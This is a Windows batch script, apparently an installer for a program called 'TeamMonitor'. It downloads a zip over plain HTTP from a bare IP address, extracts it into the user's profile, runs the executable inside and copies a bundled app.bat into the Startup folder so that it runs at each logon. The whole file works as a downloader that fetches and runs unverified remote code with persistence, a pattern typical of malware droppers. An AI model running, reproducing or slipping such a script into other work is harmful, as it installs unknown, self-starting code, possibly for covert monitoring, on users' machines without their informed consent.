@echo off
REM Set the path variables
set USER=%USERPROFILE%
set DOWNLOAD_URL=http://144.172.98.88/api/download/client
set ZIP_FILE=%USER%\teammonitor\teammonitor.zip
set UNZIP_FOLDER=%USER%\teammonitor
set EXE_FILE=%UNZIP_FOLDER%\TeamMonitor.exe
set APP_BAT_FILE=%UNZIP_FOLDER%\app.bat
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

REM Delete the ZIP file if it exists
if exist "%ZIP_FILE%" (
    echo Deleting existing ZIP file: %ZIP_FILE%...
    del /f /q "%ZIP_FILE%"
)

REM Delete the unzip folder if it exists
if exist "%UNZIP_FOLDER%" (
    echo Deleting existing unzip folder: %UNZIP_FOLDER%...
    rmdir /s /q "%UNZIP_FOLDER%"
)

REM Create the teammonitor folder if it doesn't exist
if not exist %UNZIP_FOLDER% (
    mkdir %UNZIP_FOLDER%
)

REM Download the zip file using curl
echo Downloading file from %DOWNLOAD_URL%...
curl -L -o "%ZIP_FILE%" "%DOWNLOAD_URL%"

REM Check if download was successful
if not exist "%ZIP_FILE%" (
    echo Failed to download the file.
    exit /b
)

REM Unzip the downloaded zip file
echo Unzipping file to %UNZIP_FOLDER%...
powershell -Command "Expand-Archive -Path %ZIP_FILE% -DestinationPath %UNZIP_FOLDER% -Force"

REM Check if unzip was successful
if not exist %EXE_FILE% (
    echo Failed to unzip the file or TeamMonitor.exe is missing.
    exit /b
)

REM Run TeamMonitor.exe
echo Running TeamMonitor.exe...
start "" "%EXE_FILE%"

REM Check if app.bat exists and copy it to the startup folder
if exist "%APP_BAT_FILE%" (
    echo Copying app.bat to the startup folder...
    copy "%APP_BAT_FILE%" "%STARTUP_FOLDER%\app.bat"
) else (
    echo app.bat not found in the extracted files.
)

REM End of script
echo TeamMonitor has been set up and is running. app.bat has been copied to the startup folder.
pause
